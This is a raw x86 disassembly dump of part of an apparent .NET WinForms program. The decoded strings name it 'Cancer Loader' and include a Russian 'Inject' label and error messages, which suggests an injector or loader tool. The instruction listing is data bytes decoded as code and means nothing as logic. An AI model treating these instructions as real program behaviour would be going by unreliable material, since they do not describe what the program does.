  40583a:	72 6d                	jb     0x4058a9
  40583c:	73 00                	jae    0x40583e
  40583e:	47                   	inc    %edi
  40583f:	75 6e                	jne    0x4058af
  405841:	61                   	popa
  405842:	2e 55                	cs push %ebp
  405844:	49                   	dec    %ecx
  405845:	32 2e                	xor    (%esi),%ch
  405847:	57                   	push   %edi
  405848:	69 6e 46 6f 72 6d 73 	imul   $0x736d726f,0x46(%esi),%ebp
  40584f:	00 47 75             	add    %al,0x75(%edi)
  405852:	6e                   	outsb  %ds:(%esi),(%dx)
  405853:	61                   	popa
  405854:	2e 55                	cs push %ebp
  405856:	49                   	dec    %ecx
  405857:	32 2e                	xor    (%esi),%ch
  405859:	57                   	push   %edi
  40585a:	69 6e 46 6f 72 6d 73 	imul   $0x736d726f,0x46(%esi),%ebp
  405861:	2e 45                	cs inc %ebp
  405863:	6e                   	outsb  %ds:(%esi),(%dx)
  405864:	75 6d                	jne    0x4058d3
  405866:	73 00                	jae    0x405868
  405868:	73 65                	jae    0x4058cf
  40586a:	74 5f                	je     0x4058cb
  40586c:	41                   	inc    %ecx
  40586d:	75 74                	jne    0x4058e3
  40586f:	6f                   	outsl  %ds:(%esi),(%dx)
  405870:	53                   	push   %ebx
  405871:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  405874:	65 44                	gs inc %esp
  405876:	69 6d 65 6e 73 69 6f 	imul   $0x6f69736e,0x65(%ebp),%ebp
  40587d:	6e                   	outsb  %ds:(%esi),(%dx)
  40587e:	73 00                	jae    0x405880
  405880:	4d                   	dec    %ebp
  405881:	65 73 73             	gs jae 0x4058f7
  405884:	61                   	popa
  405885:	67 65 42             	addr16 gs inc %edx
  405888:	6f                   	outsl  %ds:(%esi),(%dx)
  405889:	78 42                	js     0x4058cd
  40588b:	75 74                	jne    0x405901
  40588d:	74 6f                	je     0x4058fe
  40588f:	6e                   	outsb  %ds:(%esi),(%dx)
  405890:	73 00                	jae    0x405892
  405892:	62 75 74             	bound  %esi,0x74(%ebp)
  405895:	74 6f                	je     0x405906
  405897:	6e                   	outsb  %ds:(%esi),(%dx)
  405898:	73 00                	jae    0x40589a
  40589a:	73 65                	jae    0x405901
  40589c:	74 5f                	je     0x4058fd
  40589e:	42                   	inc    %edx
  40589f:	6f                   	outsl  %ds:(%esi),(%dx)
  4058a0:	72 64                	jb     0x405906
  4058a2:	65 72 54             	gs jb  0x4058f9
  4058a5:	68 69 63 6b 6e       	push   $0x6e6b6369
  4058aa:	65 73 73             	gs jae 0x405920
  4058ad:	00 63 6f             	add    %ah,0x6f(%ebx)
  4058b0:	6d                   	insl   (%dx),%es:(%edi)
  4058b1:	70 6f                	jo     0x405922
  4058b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4058b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4058b6:	74 73                	je     0x40592b
  4058b8:	00 45 78             	add    %al,0x78(%ebp)
  4058bb:	69 73 74 73 00 73 65 	imul   $0x65730073,0x74(%ebx),%esi
  4058c2:	74 5f                	je     0x405923
  4058c4:	42                   	inc    %edx
  4058c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c6:	72 64                	jb     0x40592c
  4058c8:	65 72 52             	gs jb  0x40591d
  4058cb:	61                   	popa
  4058cc:	64 69 75 73 00 73 74 	imul   $0x61747300,%fs:0x73(%ebp),%esi
  4058d3:	61 
  4058d4:	74 75                	je     0x40594b
  4058d6:	73 00                	jae    0x4058d8
  4058d8:	4f                   	dec    %edi
  4058d9:	62 6a 65             	bound  %ebp,0x65(%edx)
  4058dc:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  4058e0:	65 74 5f             	gs je  0x405942
  4058e3:	48                   	dec    %eax
  4058e4:	65 69 67 68 74 00 45 	imul   $0x78450074,%gs:0x68(%edi),%esp
  4058eb:	78 
  4058ec:	69 74 00 67 65 74 5f 	imul   $0x445f7465,0x67(%eax,%eax,1),%esi
  4058f3:	44 
  4058f4:	65 66 61             	gs popaw
  4058f7:	75 6c                	jne    0x405965
  4058f9:	74 00                	je     0x4058fb
  4058fb:	53                   	push   %ebx
  4058fc:	65 74 43             	gs je  0x405942
  4058ff:	6f                   	outsl  %ds:(%esi),(%dx)
  405900:	6d                   	insl   (%dx),%es:(%edi)
  405901:	70 61                	jo     0x405964
  405903:	74 69                	je     0x40596e
  405905:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  405909:	65 78 74             	gs js  0x405980
  40590c:	52                   	push   %edx
  40590d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40590f:	64 65 72 69          	fs gs jb 0x40597c
  405913:	6e                   	outsb  %ds:(%esi),(%dx)
  405914:	67 44                	addr16 inc %esp
  405916:	65 66 61             	gs popaw
  405919:	75 6c                	jne    0x405987
  40591b:	74 00                	je     0x40591d
  40591d:	44                   	inc    %esp
  40591e:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  405925:	73 75                	jae    0x40599c
  405927:	6c                   	insb   (%dx),%es:(%edi)
  405928:	74 00                	je     0x40592a
  40592a:	47                   	inc    %edi
  40592b:	65 74 52             	gs je  0x405980
  40592e:	65 73 75             	gs jae 0x4059a6
  405931:	6c                   	insb   (%dx),%es:(%edi)
  405932:	74 00                	je     0x405934
  405934:	53                   	push   %ebx
  405935:	65 74 52             	gs je  0x40598a
  405938:	65 73 75             	gs jae 0x4059b0
  40593b:	6c                   	insb   (%dx),%es:(%edi)
  40593c:	74 00                	je     0x40593e
  40593e:	49                   	dec    %ecx
  40593f:	6e                   	outsb  %ds:(%esi),(%dx)
  405940:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  405947:	65 
  405948:	43                   	inc    %ebx
  405949:	6f                   	outsl  %ds:(%esi),(%dx)
  40594a:	6d                   	insl   (%dx),%es:(%edi)
  40594b:	70 6f                	jo     0x4059bc
  40594d:	6e                   	outsb  %ds:(%esi),(%dx)
  40594e:	65 6e                	outsb  %gs:(%esi),(%dx)
  405950:	74 00                	je     0x405952
  405952:	67 65 74 5f          	addr16 gs je 0x4059b5
  405956:	54                   	push   %esp
  405957:	72 61                	jb     0x4059ba
  405959:	6e                   	outsb  %ds:(%esi),(%dx)
  40595a:	73 70                	jae    0x4059cc
  40595c:	61                   	popa
  40595d:	72 65                	jb     0x4059c4
  40595f:	6e                   	outsb  %ds:(%esi),(%dx)
  405960:	74 00                	je     0x405962
  405962:	73 65                	jae    0x4059c9
  405964:	74 5f                	je     0x4059c5
  405966:	54                   	push   %esp
  405967:	65 78 74             	gs js  0x4059de
  40596a:	52                   	push   %edx
  40596b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40596d:	64 65 72 69          	fs gs jb 0x4059da
  405971:	6e                   	outsb  %ds:(%esi),(%dx)
  405972:	67 48                	addr16 dec %eax
  405974:	69 6e 74 00 50 6f 69 	imul   $0x696f5000,0x74(%esi),%ebp
  40597b:	6e                   	outsb  %ds:(%esi),(%dx)
  40597c:	74 00                	je     0x40597e
  40597e:	73 65                	jae    0x4059e5
  405980:	74 5f                	je     0x4059e1
  405982:	46                   	inc    %esi
  405983:	6f                   	outsl  %ds:(%esi),(%dx)
  405984:	6e                   	outsb  %ds:(%esi),(%dx)
  405985:	74 00                	je     0x405987
  405987:	53                   	push   %ebx
  405988:	74 61                	je     0x4059eb
  40598a:	72 74                	jb     0x405a00
  40598c:	00 53 75             	add    %dl,0x75(%ebx)
  40598f:	73 70                	jae    0x405a01
  405991:	65 6e                	outsb  %gs:(%esi),(%dx)
  405993:	64 4c                	fs dec %esp
  405995:	61                   	popa
  405996:	79 6f                	jns    0x405a07
  405998:	75 74                	jne    0x405a0e
  40599a:	00 52 65             	add    %dl,0x65(%edx)
  40599d:	73 75                	jae    0x405a14
  40599f:	6d                   	insl   (%dx),%es:(%edi)
  4059a0:	65 4c                	gs dec %esp
  4059a2:	61                   	popa
  4059a3:	79 6f                	jns    0x405a14
  4059a5:	75 74                	jne    0x405a1b
  4059a7:	00 50 65             	add    %dl,0x65(%eax)
  4059aa:	72 66                	jb     0x405a12
  4059ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4059ad:	72 6d                	jb     0x405a1c
  4059af:	4c                   	dec    %esp
  4059b0:	61                   	popa
  4059b1:	79 6f                	jns    0x405a22
  4059b3:	75 74                	jne    0x405a29
  4059b5:	00 4d 6f             	add    %cl,0x6f(%ebp)
  4059b8:	76 65                	jbe    0x405a1f
  4059ba:	4e                   	dec    %esi
  4059bb:	65 78 74             	gs js  0x405a32
  4059be:	00 53 79             	add    %dl,0x79(%ebx)
  4059c1:	73 74                	jae    0x405a37
  4059c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4059c5:	2e 44                	cs inc %esp
  4059c7:	72 61                	jb     0x405a2a
  4059c9:	77 69                	ja     0x405a34
  4059cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4059cc:	67 2e 54             	addr16 cs push %esp
  4059cf:	65 78 74             	gs js  0x405a46
  4059d2:	00 73 65             	add    %dh,0x65(%ebx)
  4059d5:	74 5f                	je     0x405a36
  4059d7:	54                   	push   %esp
  4059d8:	65 78 74             	gs js  0x405a4f
  4059db:	00 53 68             	add    %dl,0x68(%ebx)
  4059de:	6f                   	outsl  %ds:(%esi),(%dx)
  4059df:	77 00                	ja     0x4059e1
  4059e1:	73 65                	jae    0x405a48
  4059e3:	74 5f                	je     0x405a44
  4059e5:	54                   	push   %esp
  4059e6:	61                   	popa
  4059e7:	62 49 6e             	bound  %ecx,0x6e(%ecx)
  4059ea:	64 65 78 00          	fs gs js 0x4059ee
  4059ee:	4d                   	dec    %ebp
  4059ef:	65 73 73             	gs jae 0x405a65
  4059f2:	61                   	popa
  4059f3:	67 65 42             	addr16 gs inc %edx
  4059f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059f7:	78 00                	js     0x4059f9
  4059f9:	73 65                	jae    0x405a60
  4059fb:	74 5f                	je     0x405a5c
  4059fd:	4d                   	dec    %ebp
  4059fe:	61                   	popa
  4059ff:	78 69                	js     0x405a6a
  405a01:	6d                   	insl   (%dx),%es:(%edi)
  405a02:	69 7a 65 42 6f 78 00 	imul   $0x786f42,0x65(%edx),%edi
  405a09:	47                   	inc    %edi
  405a0a:	75 6e                	jne    0x405a7a
  405a0c:	61                   	popa
  405a0d:	32 43 6f             	xor    0x6f(%ebx),%al
  405a10:	6e                   	outsb  %ds:(%esi),(%dx)
  405a11:	74 72                	je     0x405a85
  405a13:	6f                   	outsl  %ds:(%esi),(%dx)
  405a14:	6c                   	insb   (%dx),%es:(%edi)
  405a15:	42                   	inc    %edx
  405a16:	6f                   	outsl  %ds:(%esi),(%dx)
  405a17:	78 00                	js     0x405a19
  405a19:	44                   	inc    %esp
  405a1a:	65 6c                	gs insb (%dx),%es:(%edi)
  405a1c:	61                   	popa
  405a1d:	79 00                	jns    0x405a1f
  405a1f:	54                   	push   %esp
  405a20:	6f                   	outsl  %ds:(%esi),(%dx)
  405a21:	41                   	inc    %ecx
  405a22:	72 72                	jb     0x405a96
  405a24:	61                   	popa
  405a25:	79 00                	jns    0x405a27
  405a27:	67 65 74 5f          	addr16 gs je 0x405a8a
  405a2b:	41                   	inc    %ecx
  405a2c:	73 73                	jae    0x405aa1
  405a2e:	65 6d                	gs insl (%dx),%es:(%edi)
  405a30:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  405a34:	67 65 74 5f          	addr16 gs je 0x405a97
  405a38:	42                   	inc    %edx
  405a39:	61                   	popa
  405a3a:	73 65                	jae    0x405aa1
  405a3c:	44                   	inc    %esp
  405a3d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  405a44:	79 00                	jns    0x405a46
  405a46:	6f                   	outsl  %ds:(%esi),(%dx)
  405a47:	70 5f                	jo     0x405aa8
  405a49:	49                   	dec    %ecx
  405a4a:	6e                   	outsb  %ds:(%esi),(%dx)
  405a4b:	65 71 75             	gs jno 0x405ac3
  405a4e:	61                   	popa
  405a4f:	6c                   	insb   (%dx),%es:(%edi)
  405a50:	69 74 79 00 00 4b 57 	imul   $0x574b00,0x0(%ecx,%edi,2),%esi
  405a57:	00 
  405a58:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405a5e:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5f:	00 77 00             	add    %dh,0x0(%edi)
  405a62:	73 00                	jae    0x405a64
  405a64:	46                   	inc    %esi
  405a65:	00 6f 00             	add    %ch,0x0(%edi)
  405a68:	72 00                	jb     0x405a6a
  405a6a:	6d                   	insl   (%dx),%es:(%edi)
  405a6b:	00 73 00             	add    %dh,0x0(%ebx)
  405a6e:	41                   	inc    %ecx
  405a6f:	00 70 00             	add    %dh,0x0(%eax)
  405a72:	70 00                	jo     0x405a74
  405a74:	31 00                	xor    %eax,(%eax)
  405a76:	2e 00 50 00          	add    %dl,%cs:0x0(%eax)
  405a7a:	72 00                	jb     0x405a7c
  405a7c:	6f                   	outsl  %ds:(%esi),(%dx)
  405a7d:	00 70 00             	add    %dh,0x0(%eax)
  405a80:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405a84:	74 00                	je     0x405a86
  405a86:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  405a8c:	2e 00 52 00          	add    %dl,%cs:0x0(%edx)
  405a90:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  405a94:	6f                   	outsl  %ds:(%esi),(%dx)
  405a95:	00 75 00             	add    %dh,0x0(%ebp)
  405a98:	72 00                	jb     0x405a9a
  405a9a:	63 00                	arpl   %eax,(%eax)
  405a9c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  405aa0:	00 17                	add    %dl,(%edi)
  405aa2:	67 00 75 00          	add    %dh,0x0(%di)
  405aa6:	6e                   	outsb  %ds:(%esi),(%dx)
  405aa7:	00 61 00             	add    %ah,0x0(%ecx)
  405aaa:	32 00                	xor    (%eax),%al
  405aac:	50                   	push   %eax
  405aad:	00 61 00             	add    %ah,0x0(%ecx)
  405ab0:	6e                   	outsb  %ds:(%esi),(%dx)
  405ab1:	00 65 00             	add    %ah,0x0(%ebp)
  405ab4:	6c                   	insb   (%dx),%es:(%edi)
  405ab5:	00 31                	add    %dh,(%ecx)
  405ab7:	00 00                	add    %al,(%eax)
  405ab9:	1f                   	pop    %ds
  405aba:	67 00 75 00          	add    %dh,0x0(%di)
  405abe:	6e                   	outsb  %ds:(%esi),(%dx)
  405abf:	00 61 00             	add    %ah,0x0(%ecx)
  405ac2:	32 00                	xor    (%eax),%al
  405ac4:	53                   	push   %ebx
  405ac5:	00 65 00             	add    %ah,0x0(%ebp)
  405ac8:	70 00                	jo     0x405aca
  405aca:	61                   	popa
  405acb:	00 72 00             	add    %dh,0x0(%edx)
  405ace:	61                   	popa
  405acf:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  405ad3:	00 72 00             	add    %dh,0x0(%edx)
  405ad6:	31 00                	xor    %eax,(%eax)
  405ad8:	00 17                	add    %dl,(%edi)
  405ada:	67 00 75 00          	add    %dh,0x0(%di)
  405ade:	6e                   	outsb  %ds:(%esi),(%dx)
  405adf:	00 61 00             	add    %ah,0x0(%ecx)
  405ae2:	32 00                	xor    (%eax),%al
  405ae4:	50                   	push   %eax
  405ae5:	00 61 00             	add    %ah,0x0(%ecx)
  405ae8:	6e                   	outsb  %ds:(%esi),(%dx)
  405ae9:	00 65 00             	add    %ah,0x0(%ebp)
  405aec:	6c                   	insb   (%dx),%es:(%edi)
  405aed:	00 32                	add    %dh,(%edx)
  405aef:	00 00                	add    %al,(%eax)
  405af1:	21 67 00             	and    %esp,0x0(%edi)
  405af4:	75 00                	jne    0x405af6
  405af6:	6e                   	outsb  %ds:(%esi),(%dx)
  405af7:	00 61 00             	add    %ah,0x0(%ecx)
  405afa:	32 00                	xor    (%eax),%al
  405afc:	43                   	inc    %ebx
  405afd:	00 6f 00             	add    %ch,0x0(%edi)
  405b00:	6e                   	outsb  %ds:(%esi),(%dx)
  405b01:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  405b05:	00 6f 00             	add    %ch,0x0(%edi)
  405b08:	6c                   	insb   (%dx),%es:(%edi)
  405b09:	00 42 00             	add    %al,0x0(%edx)
  405b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b0d:	00 78 00             	add    %bh,0x0(%eax)
  405b10:	32 00                	xor    (%eax),%al
  405b12:	00 21                	add    %ah,(%ecx)
  405b14:	67 00 75 00          	add    %dh,0x0(%di)
  405b18:	6e                   	outsb  %ds:(%esi),(%dx)
  405b19:	00 61 00             	add    %ah,0x0(%ecx)
  405b1c:	32 00                	xor    (%eax),%al
  405b1e:	43                   	inc    %ebx
  405b1f:	00 6f 00             	add    %ch,0x0(%edi)
  405b22:	6e                   	outsb  %ds:(%esi),(%dx)
  405b23:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  405b27:	00 6f 00             	add    %ch,0x0(%edi)
  405b2a:	6c                   	insb   (%dx),%es:(%edi)
  405b2b:	00 42 00             	add    %al,0x0(%edx)
  405b2e:	6f                   	outsl  %ds:(%esi),(%dx)
  405b2f:	00 78 00             	add    %bh,0x0(%eax)
  405b32:	31 00                	xor    %eax,(%eax)
  405b34:	00 11                	add    %dl,(%ecx)
  405b36:	53                   	push   %ebx
  405b37:	00 65 00             	add    %ah,0x0(%ebp)
  405b3a:	67 00 6f 00          	add    %ch,0x0(%bx)
  405b3e:	65 00 20             	add    %ah,%gs:(%eax)
  405b41:	00 55 00             	add    %dl,0x0(%ebp)
  405b44:	49                   	dec    %ecx
  405b45:	00 00                	add    %al,(%eax)
  405b47:	1f                   	pop    %ds
  405b48:	67 00 75 00          	add    %dh,0x0(%di)
  405b4c:	6e                   	outsb  %ds:(%esi),(%dx)
  405b4d:	00 61 00             	add    %ah,0x0(%ecx)
  405b50:	32 00                	xor    (%eax),%al
  405b52:	48                   	dec    %eax
  405b53:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  405b57:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  405b5b:	00 61 00             	add    %ah,0x0(%ecx)
  405b5e:	62 00                	bound  %eax,(%eax)
  405b60:	65 00 6c 00 31       	add    %ch,%gs:0x31(%eax,%eax,1)
  405b65:	00 00                	add    %al,(%eax)
  405b67:	23 a1 26 20 00 43    	and    0x43002026(%ecx),%esp
  405b6d:	00 41 00             	add    %al,0x0(%ecx)
  405b70:	4e                   	dec    %esi
  405b71:	00 43 00             	add    %al,0x0(%ebx)
  405b74:	45                   	inc    %ebp
  405b75:	00 52 00             	add    %dl,0x0(%edx)
  405b78:	20 00                	and    %al,(%eax)
  405b7a:	4c                   	dec    %esp
  405b7b:	00 4f 00             	add    %cl,0x0(%edi)
  405b7e:	41                   	inc    %ecx
  405b7f:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  405b83:	00 52 00             	add    %dl,0x0(%edx)
  405b86:	20 00                	and    %al,(%eax)
  405b88:	a1 26 01 19 67       	mov    0x67190126,%eax
  405b8d:	00 75 00             	add    %dh,0x0(%ebp)
  405b90:	6e                   	outsb  %ds:(%esi),(%dx)
  405b91:	00 61 00             	add    %ah,0x0(%ecx)
  405b94:	32 00                	xor    (%eax),%al
  405b96:	42                   	inc    %edx
  405b97:	00 75 00             	add    %dh,0x0(%ebp)
  405b9a:	74 00                	je     0x405b9c
  405b9c:	74 00                	je     0x405b9e
  405b9e:	6f                   	outsl  %ds:(%esi),(%dx)
  405b9f:	00 6e 00             	add    %ch,0x0(%esi)
  405ba2:	32 00                	xor    (%eax),%al
  405ba4:	00 09                	add    %cl,(%ecx)
  405ba6:	4c                   	dec    %esp
  405ba7:	00 4f 00             	add    %cl,0x0(%edi)
  405baa:	41                   	inc    %ecx
  405bab:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  405baf:	23 67 00             	and    0x0(%edi),%esp
  405bb2:	75 00                	jne    0x405bb4
  405bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  405bb5:	00 61 00             	add    %ah,0x0(%ecx)
  405bb8:	32 00                	xor    (%eax),%al
  405bba:	50                   	push   %eax
  405bbb:	00 72 00             	add    %dh,0x0(%edx)
  405bbe:	6f                   	outsl  %ds:(%esi),(%dx)
  405bbf:	00 67 00             	add    %ah,0x0(%edi)
  405bc2:	72 00                	jb     0x405bc4
  405bc4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  405bc8:	73 00                	jae    0x405bca
  405bca:	42                   	inc    %edx
  405bcb:	00 61 00             	add    %ah,0x0(%ecx)
  405bce:	72 00                	jb     0x405bd0
  405bd0:	31 00                	xor    %eax,(%eax)
  405bd2:	00 0b                	add    %cl,(%ebx)
  405bd4:	46                   	inc    %esi
  405bd5:	00 6f 00             	add    %ch,0x0(%edi)
  405bd8:	72 00                	jb     0x405bda
  405bda:	6d                   	insl   (%dx),%es:(%edi)
  405bdb:	00 31                	add    %dh,(%ecx)
  405bdd:	00 00                	add    %al,(%eax)
  405bdf:	1b 43 00             	sbb    0x0(%ebx),%eax
  405be2:	61                   	popa
  405be3:	00 6e 00             	add    %ch,0x0(%esi)
  405be6:	63 00                	arpl   %eax,(%eax)
  405be8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405bec:	20 00                	and    %al,(%eax)
  405bee:	4c                   	dec    %esp
  405bef:	00 6f 00             	add    %ch,0x0(%edi)
  405bf2:	61                   	popa
  405bf3:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405bf7:	00 72 00             	add    %dh,0x0(%edx)
  405bfa:	00 23                	add    %ah,(%ebx)
  405bfc:	52                   	push   %edx
  405bfd:	00 75 00             	add    %dh,0x0(%ebp)
  405c00:	6e                   	outsb  %ds:(%esi),(%dx)
  405c01:	00 6e 00             	add    %ch,0x0(%esi)
  405c04:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405c08:	2e 00 45 00          	add    %al,%cs:0x0(%ebp)
  405c0c:	6e                   	outsb  %ds:(%esi),(%dx)
  405c0d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  405c11:	00 79 00             	add    %bh,0x0(%ecx)
  405c14:	50                   	push   %eax
  405c15:	00 6f 00             	add    %ch,0x0(%edi)
  405c18:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  405c1e:	00 07                	add    %al,(%edi)
  405c20:	58                   	pop    %eax
  405c21:	00 58 00             	add    %bl,0x0(%eax)
  405c24:	43                   	inc    %ebx
  405c25:	00 00                	add    %al,(%eax)
  405c27:	09 4d 00             	or     %ecx,0x0(%ebp)
  405c2a:	61                   	popa
  405c2b:	00 69 00             	add    %ch,0x0(%ecx)
  405c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  405c2f:	00 00                	add    %al,(%eax)
  405c31:	0d 43 00 61 00       	or     $0x610043,%eax
  405c36:	6e                   	outsb  %ds:(%esi),(%dx)
  405c37:	00 63 00             	add    %ah,0x0(%ebx)
  405c3a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405c3e:	00 17                	add    %dl,(%edi)
  405c40:	52                   	push   %edx
  405c41:	00 75 00             	add    %dh,0x0(%ebp)
  405c44:	6e                   	outsb  %ds:(%esi),(%dx)
  405c45:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  405c49:	00 6d 00             	add    %ch,0x0(%ebp)
  405c4c:	65 00 2e             	add    %ch,%gs:(%esi)
  405c4f:	00 70 00             	add    %dh,0x0(%eax)
  405c52:	6e                   	outsb  %ds:(%esi),(%dx)
  405c53:	00 67 00             	add    %ah,0x0(%edi)
  405c56:	00 15 1e 04 48 04    	add    %dl,0x448041e
  405c5c:	38 04 31             	cmp    %al,(%ecx,%esi,1)
  405c5f:	04 3a                	add    $0x3a,%al
  405c61:	04 30                	add    $0x30,%al
  405c63:	04 20                	add    $0x20,%al
  405c65:	00 31                	add    %dh,(%ecx)
  405c67:	00 30                	add    %dh,(%eax)
  405c69:	00 31                	add    %dh,(%ecx)
  405c6b:	00 01                	add    %al,(%ecx)
  405c6d:	0d 18 04 3d 04       	or     $0x43d0418,%eax
  405c72:	36 04 35             	ss add $0x35,%al
  405c75:	04 3a                	add    $0x3a,%al
  405c77:	04 42                	add    $0x42,%al
  405c79:	04 01                	add    $0x1,%al
  405c7b:	15 1e 04 48 04       	adc    $0x448041e,%eax
  405c80:	38 04 31             	cmp    %al,(%ecx,%esi,1)
  405c83:	04 3a                	add    $0x3a,%al
  405c85:	04 30                	add    $0x30,%al
  405c87:	04 20                	add    $0x20,%al
  405c89:	00 31                	add    %dh,(%ecx)
  405c8b:	00 30                	add    %dh,(%eax)
  405c8d:	00 32                	add    %dh,(%edx)
  405c8f:	00 01                	add    %al,(%ecx)
  405c91:	15 1e 04 48 04       	adc    $0x448041e,%eax
  405c96:	38 04 31             	cmp    %al,(%ecx,%esi,1)
  405c99:	04 3a                	add    $0x3a,%al
  405c9b:	04 30                	add    $0x30,%al
  405c9d:	04 20                	add    $0x20,%al
  405c9f:	00 31                	add    %dh,(%ecx)
  405ca1:	00 30                	add    %dh,(%eax)
  405ca3:	00 30                	add    %dh,(%eax)
  405ca5:	00 01                	add    %al,(%ecx)
  405ca7:	00 24 06             	add    %ah,(%esi,%eax,1)
  405caa:	31 2b                	xor    %ebp,(%ebx)
  405cac:	a8 ba                	test   $0xba,%al
  405cae:	3e 40                	ds inc %eax
  405cb0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405cb1:	a9 fb ab 54 d2       	test   $0xd254abfb,%eax
  405cb6:	35 e6 00 04 20       	xor    $0x200400e6,%eax
  405cbb:	01 01                	add    %eax,(%ecx)
  405cbd:	08 03                	or     %al,(%ebx)
  405cbf:	20 00                	and    %al,(%eax)
  405cc1:	01 05 20 01 01 11    	add    %eax,0x11010120
  405cc7:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  405cca:	01 01                	add    %eax,(%ecx)
  405ccc:	0e                   	push   %cs
  405ccd:	04 20                	add    $0x20,%al
  405ccf:	01 01                	add    %eax,(%ecx)
  405cd1:	02 05 20 02 01 0e    	add    0xe010220,%al
  405cd7:	0e                   	push   %cs
  405cd8:	05 20 01 01 11       	add    $0x11010120,%eax
  405cdd:	5d                   	pop    %ebp
  405cde:	06                   	push   %es
  405cdf:	20 01                	and    %al,(%ecx)
  405ce1:	01 12                	add    %edx,(%edx)
  405ce3:	80 91 06 20 01 01 12 	adcb   $0x12,0x1012006(%ecx)
  405cea:	80 c9 03             	or     $0x3,%cl
  405ced:	00 00                	add    %al,(%eax)
  405cef:	01 04 00             	add    %eax,(%eax,%eax,1)
  405cf2:	01 01                	add    %eax,(%ecx)
  405cf4:	02 05 00 01 01 12    	add    0x12010100,%al
  405cfa:	69 08 00 01 12 80    	imul   $0x80120100,(%eax),%ecx
  405d00:	91                   	xchg   %eax,%ecx
  405d01:	11 80 ed 05 20 00    	adc    %eax,0x2005ed(%eax)
  405d07:	12 80 bd 07 20 02    	adc    0x22007bd(%eax),%al
  405d0d:	01 0e                	add    %ecx,(%esi)
  405d0f:	12 80 bd 08 00 01    	adc    0x10008bd(%eax),%al
  405d15:	12 80 f1 12 80 f1    	adc    -0xe7fed0f(%eax),%al
  405d1b:	04 07                	add    $0x7,%al
  405d1d:	01 11                	add    %edx,(%ecx)
  405d1f:	30 07                	xor    %al,(%edi)
  405d21:	15 11 80 e1 01       	adc    $0x1e18011,%eax
  405d26:	1d 05 09 00 00       	sbb    $0x905,%eax
  405d2b:	15 11 80 e1 01       	adc    $0x1e18011,%eax
  405d30:	13 00                	adc    (%eax),%eax
  405d32:	07                   	pop    %es
  405d33:	30 01                	xor    %al,(%ecx)
  405d35:	01 01                	add    %eax,(%ecx)
  405d37:	10 1e                	adc    %bl,(%esi)
  405d39:	00 04 0a             	add    %al,(%edx,%ecx,1)
  405d3c:	01 11                	add    %edx,(%ecx)
  405d3e:	30 09                	xor    %cl,(%ecx)
  405d40:	20 00                	and    %al,(%eax)
  405d42:	15 12 80 99 01       	adc    $0x1998012,%eax
  405d47:	13 00                	adc    (%eax),%eax
  405d49:	04 07                	add    $0x7,%al
  405d4b:	01 11                	add    %edx,(%ecx)
  405d4d:	44                   	inc    %esp
  405d4e:	05 00 00 11 80       	add    $0x80110000,%eax
  405d53:	d5 04                	aad    $0x4
  405d55:	0a 01                	or     (%ecx),%al
  405d57:	11 44 05 20          	adc    %eax,0x20(%ebp,%eax,1)
  405d5b:	00 12                	add    %dl,(%edx)
  405d5d:	80 9d 04 07 01 11 34 	sbbb   $0x34,0x11010704(%ebp)
  405d64:	04 0a                	add    $0xa,%al
  405d66:	01 11                	add    %edx,(%ecx)
  405d68:	34 04                	xor    $0x4,%al
  405d6a:	07                   	pop    %es
  405d6b:	01 11                	add    %edx,(%ecx)
  405d6d:	48                   	dec    %eax
  405d6e:	04 0a                	add    $0xa,%al
  405d70:	01 11                	add    %edx,(%ecx)
  405d72:	48                   	dec    %eax
  405d73:	04 07                	add    $0x7,%al
  405d75:	01 11                	add    %edx,(%ecx)
  405d77:	38 06                	cmp    %al,(%esi)
  405d79:	15 11 80 e1 01       	adc    $0x1e18011,%eax
  405d7e:	02 04 0a             	add    (%edx,%ecx,1),%al
  405d81:	01 11                	add    %edx,(%ecx)
  405d83:	38 04 07             	cmp    %al,(%edi,%eax,1)
  405d86:	01 11                	add    %edx,(%ecx)
  405d88:	50                   	push   %eax
  405d89:	05 00 00 11 80       	add    $0x80110000,%eax
  405d8e:	e5 04                	in     $0x4,%eax
  405d90:	0a 01                	or     (%ecx),%al
  405d92:	11 50 04             	adc    %edx,0x4(%eax)
  405d95:	07                   	pop    %es
